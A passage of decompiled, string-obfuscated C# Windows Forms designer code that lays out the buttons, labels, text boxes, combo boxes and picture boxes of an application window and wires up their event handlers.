		((Control)button94).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD0456A6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925);
		((Control)button94).Size = new Size(71, 23);
		((Control)button94).TabIndex = 176;
		((Control)button94).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C9A2C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823);
		((ButtonBase)button94).UseVisualStyleBackColor = false;
		((Control)button94).Click += button94_Click;
		((Control)button96).BackColor = Color.Green;
		((Control)button96).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E0CA5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40), 8f, (FontStyle)1);
		((Control)button96).ForeColor = SystemColors.ControlLightLight;
		((Control)button96).Location = new Point(94, 622);
		((Control)button96).Margin = new Padding(5, 3, 5, 3);
		((Control)button96).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEE740 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6);
		((Control)button96).Size = new Size(66, 23);
		((Control)button96).TabIndex = 174;
		((Control)button96).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC10D8A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06);
		((ButtonBase)button96).UseVisualStyleBackColor = false;
		((Control)button96).Click += button96_Click;
		comboBox10.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox10).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A10943 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc), 10f, (FontStyle)1);
		((ListControl)comboBox10).FormattingEnabled = true;
		((Control)comboBox10).Location = new Point(244, 583);
		((Control)comboBox10).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox10).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--183415037 ^ 0x229B7BC2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3);
		((Control)comboBox10).Size = new Size(180, 24);
		((Control)comboBox10).TabIndex = 173;
		comboBox10.SelectedIndexChanged += comboBox10_SelectedIndexChanged;
		((Control)textBox20).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA0017 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208), 10f, (FontStyle)1);
		((Control)textBox20).Location = new Point(730, 652);
		((Control)textBox20).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C11CF2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a);
		((Control)textBox20).Size = new Size(262, 23);
		((Control)textBox20).TabIndex = 166;
		((Control)textBox20).TextChanged += textBox20_TextChanged;
		((Control)textBox54).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA8947 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed), 10f, (FontStyle)1);
		((Control)textBox54).Location = new Point(998, 652);
		((Control)textBox54).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DFBEF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((Control)textBox54).Size = new Size(238, 23);
		((Control)textBox54).TabIndex = 164;
		((Control)textBox54).TextChanged += textBox54_TextChanged;
		((Control)label38).AutoSize = true;
		((Control)label38).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--183415037 ^ 0x189FBB91 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2), 10f, (FontStyle)1);
		((Control)label38).ForeColor = SystemColors.ControlLightLight;
		((Control)label38).Location = new Point(728, 629);
		((Control)label38).Margin = new Padding(5, 0, 5, 0);
		((Control)label38).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F7B73 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc);
		((Control)label38).Size = new Size(92, 16);
		((Control)label38).TabIndex = 163;
		((Control)label38).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E915F3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)label94).AutoSize = true;
		((Control)label94).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD04475C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925), 10f, (FontStyle)1);
		((Control)label94).ForeColor = SystemColors.ControlLightLight;
		((Control)label94).Location = new Point(995, 629);
		((Control)label94).Margin = new Padding(5, 0, 5, 0);
		((Control)label94).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x540450E1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d2a5bdc84a4644acb5d9fa871e9d89cc);
		((Control)label94).Size = new Size(100, 16);
		((Control)label94).TabIndex = 161;
		((Control)label94).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3DF28 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49);
		((Control)label95).AutoSize = true;
		((Control)label95).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF3F52 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a), 10f, (FontStyle)1);
		((Control)label95).ForeColor = SystemColors.ControlLightLight;
		((Control)label95).Location = new Point(1074, 556);
		((Control)label95).Margin = new Padding(5, 0, 5, 0);
		((Control)label95).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1F03C3B3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7);
		((Control)label95).Size = new Size(89, 16);
		((Control)label95).TabIndex = 160;
		((Control)label95).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA8EF5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)label96).AutoSize = true;
		((Control)label96).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D6DE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3), 10f, (FontStyle)1);
		((Control)label96).ForeColor = SystemColors.ControlLightLight;
		((Control)label96).Location = new Point(912, 556);
		((Control)label96).Margin = new Padding(5, 0, 5, 0);
		((Control)label96).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5ADE7D64 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d06723451b644b929e3ffec494e31c68);
		((Control)label96).Size = new Size(80, 16);
		((Control)label96).TabIndex = 159;
		((Control)label96).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A10E07 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc);
		((Control)textBox55).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x60583C09 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c), 10f, (FontStyle)1);
		((Control)textBox55).Location = new Point(730, 584);
		((Control)textBox55).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12711BBC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		((Control)textBox55).Size = new Size(168, 23);
		((Control)textBox55).TabIndex = 158;
		((Control)textBox55).TextChanged += textBox55_TextChanged;
		((Control)textBox56).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD04475C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925), 10f, (FontStyle)1);
		((Control)textBox56).Location = new Point(904, 584);
		((Control)textBox56).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC9B49 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a);
		((Control)textBox56).Size = new Size(168, 23);
		((Control)textBox56).TabIndex = 157;
		((Control)textBox56).TextChanged += textBox56_TextChanged;
		((Control)textBox57).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5ADE6C46 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d06723451b644b929e3ffec494e31c68), 10f, (FontStyle)1);
		((Control)textBox57).Location = new Point(1078, 584);
		((Control)textBox57).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA99A3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)textBox57).Size = new Size(158, 23);
		((Control)textBox57).TabIndex = 156;
		((Control)textBox57).TextChanged += textBox57_TextChanged;
		((Control)label97).AutoSize = true;
		((Control)label97).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--932377358 ^ 0x148B03B0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e), 10f, (FontStyle)1);
		((Control)label97).ForeColor = SystemColors.ControlLightLight;
		((Control)label97).Location = new Point(727, 556);
		((Control)label97).Margin = new Padding(5, 0, 5, 0);
		((Control)label97).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875CA23 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3);
		((Control)label97).Size = new Size(65, 16);
		((Control)label97).TabIndex = 155;
		((Control)label97).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13740C85 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		comboBox35.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox35).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EB93C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9), 10f, (FontStyle)1);
		((ListControl)comboBox35).FormattingEnabled = true;
		((Control)comboBox35).Location = new Point(434, 583);
		((Control)comboBox35).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox35).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC91AEE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a);
		((Control)comboBox35).Size = new Size(223, 24);
		((Control)comboBox35).TabIndex = 140;
		comboBox35.SelectedIndexChanged += comboBox35_SelectedIndexChanged;
		((Control)label104).AutoSize = true;
		((Control)label104).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BC615C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8), 10f, (FontStyle)1);
		((Control)label104).ForeColor = SystemColors.ControlLightLight;
		((Control)label104).Location = new Point(431, 556);
		((Control)label104).Margin = new Padding(5, 0, 5, 0);
		((Control)label104).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A119E7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc);
		((Control)label104).Size = new Size(77, 16);
		((Control)label104).TabIndex = 136;
		((Control)label104).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E17D7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40);
		((Control)label110).AutoSize = true;
		((Control)label110).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA11E9E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad), 10f, (FontStyle)1);
		((Control)label110).ForeColor = SystemColors.ControlLightLight;
		((Control)label110).Location = new Point(241, 556);
		((Control)label110).Margin = new Padding(5, 0, 5, 0);
		((Control)label110).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13741A0D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		((Control)label110).Size = new Size(33, 16);
		((Control)label110).TabIndex = 130;
		((Control)label110).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1BEF4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		((Control)textBox64).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E0CA5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40), 10f, (FontStyle)1);
		((Control)textBox64).Location = new Point(435, 652);
		((Control)textBox64).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DD783 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d);
		((Control)textBox64).Size = new Size(222, 23);
		((Control)textBox64).TabIndex = 129;
		((Control)textBox64).TextChanged += textBox64_TextChanged;
		((Control)textBox65).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DEA4B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782), 10f, (FontStyle)1);
		((Control)textBox65).Location = new Point(244, 652);
		((Control)textBox65).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A11925 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc);
		((Control)textBox65).Size = new Size(180, 23);
		((Control)textBox65).TabIndex = 128;
		((Control)textBox65).TextChanged += textBox65_TextChanged;
		((Control)textBox66).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC90A52 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a), 10f, (FontStyle)1);
		((Control)textBox66).Location = new Point(15, 652);
		((Control)textBox66).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BC714C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8);
		((Control)textBox66).Size = new Size(219, 23);
		((Control)textBox66).TabIndex = 127;
		((Control)textBox66).TextChanged += textBox66_TextChanged;
		((Control)label111).AutoSize = true;
		((Control)label111).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2BC06 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675), 10f, (FontStyle)1);
		((Control)label111).ForeColor = SystemColors.ControlLightLight;
		((Control)label111).Location = new Point(432, 629);
		((Control)label111).Margin = new Padding(5, 0, 5, 0);
		((Control)label111).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF2F68 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a);
		((Control)label111).Size = new Size(79, 16);
		((Control)label111).TabIndex = 126;
		((Control)label111).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0D467 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e);
		((Control)label112).AutoSize = true;
		((Control)label112).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A43EA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf), 10f, (FontStyle)1);
		((Control)label112).ForeColor = SystemColors.ControlLightLight;
		((Control)label112).Location = new Point(241, 629);
		((Control)label112).Margin = new Padding(5, 0, 5, 0);
		((Control)label112).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA10EB8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad);
		((Control)label112).Size = new Size(98, 16);
		((Control)label112).TabIndex = 125;
		((Control)label112).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DF79B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((Control)label113).AutoSize = true;
		((Control)label113).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA11E9E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad), 10f, (FontStyle)1);
		((Control)label113).ForeColor = SystemColors.ControlLightLight;
		((Control)label113).Location = new Point(11, 629);
		((Control)label113).Margin = new Padding(5, 0, 5, 0);
		((Control)label113).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1160B778 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0);
		((Control)label113).Size = new Size(82, 16);
		((Control)label113).TabIndex = 124;
		((Control)label113).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC917B4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a);
		pictureBox31.BorderStyle = (BorderStyle)2;
		((Control)pictureBox31).Enabled = false;
		((Control)pictureBox31).Location = new Point(938, 66);
		((Control)pictureBox31).Margin = new Padding(0);
		((Control)pictureBox31).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2A231 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc);
		((Control)pictureBox31).Size = new Size(275, 422);
		pictureBox31.SizeMode = (PictureBoxSizeMode)4;
		pictureBox31.TabIndex = 123;
		pictureBox31.TabStop = false;
		((Control)pictureBox31).Click += pictureBox31_Click;
		((Control)button98).BackColor = Color.Green;
		((Control)button98).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AC6C7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2), 10f, (FontStyle)1);
		((Control)button98).ForeColor = SystemColors.ControlLightLight;
		((Control)button98).Location = new Point(15, 450);
		((Control)button98).Margin = new Padding(5, 3, 5, 3);
		((Control)button98).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AD525 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2);
		((Control)button98).Size = new Size(151, 23);
		((Control)button98).TabIndex = 119;
		((Control)button98).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C5D6C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970);
		((ButtonBase)button98).UseVisualStyleBackColor = false;
		((Control)button98).Click += button98_Click;
		((Control)button99).BackColor = Color.Green;
		((Control)button99).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A43EA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button99).ForeColor = SystemColors.ControlLightLight;
		((Control)button99).Location = new Point(31, 46);
		((Control)button99).Margin = new Padding(5, 3, 5, 3);
		((Control)button99).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5ADE7FC8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d06723451b644b929e3ffec494e31c68);
		((Control)button99).Size = new Size(186, 38);
		((Control)button99).TabIndex = 118;
		((Control)button99).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DDAED ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d);
		((ButtonBase)button99).UseVisualStyleBackColor = false;
		((Control)button99).Click += button99_Click;
		((Control)label114).AutoSize = true;
		((Control)label114).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12234618 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label114).ForeColor = SystemColors.ControlLightLight;
		((Control)label114).Location = new Point(11, 370);
		((Control)label114).Margin = new Padding(5, 0, 5, 0);
		((Control)label114).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C53C4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970);
		((Control)label114).Size = new Size(89, 19);
		((Control)label114).TabIndex = 117;
		((Control)label114).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B719410 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33);
		pictureBox35.BorderStyle = (BorderStyle)2;
		((Control)pictureBox35).Location = new Point(15, 391);
		((Control)pictureBox35).Margin = new Padding(5, 3, 5, 3);
		((Control)pictureBox35).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2AFA0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675);
		((Control)pictureBox35).Size = new Size(236, 53);
		pictureBox35.SizeMode = (PictureBoxSizeMode)1;
		pictureBox35.TabIndex = 116;
		pictureBox35.TabStop = false;
		((Control)pictureBox35).Click += pictureBox35_Click;
		((Control)button100).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button100).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D6DE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3), 10f, (FontStyle)1);
		((Control)button100).ForeColor = SystemColors.ControlLightLight;
		((Control)button100).Location = new Point(167, 450);
		((Control)button100).Margin = new Padding(5, 3, 5, 3);
		((Control)button100).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319E3F4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e);
		((Control)button100).Size = new Size(84, 23);
		((Control)button100).TabIndex = 115;
		((Control)button100).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1F03CE0D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7);
		((ButtonBase)button100).UseVisualStyleBackColor = false;
		((Control)button100).Click += button100_Click;
		((Control)button101).BackColor = Color.MediumOrchid;
		((Control)button101).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EB93C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button101).ForeColor = SystemColors.ControlLightLight;
		((Control)button101).Location = new Point(15, 503);
		((Control)button101).Margin = new Padding(5, 3, 5, 3);
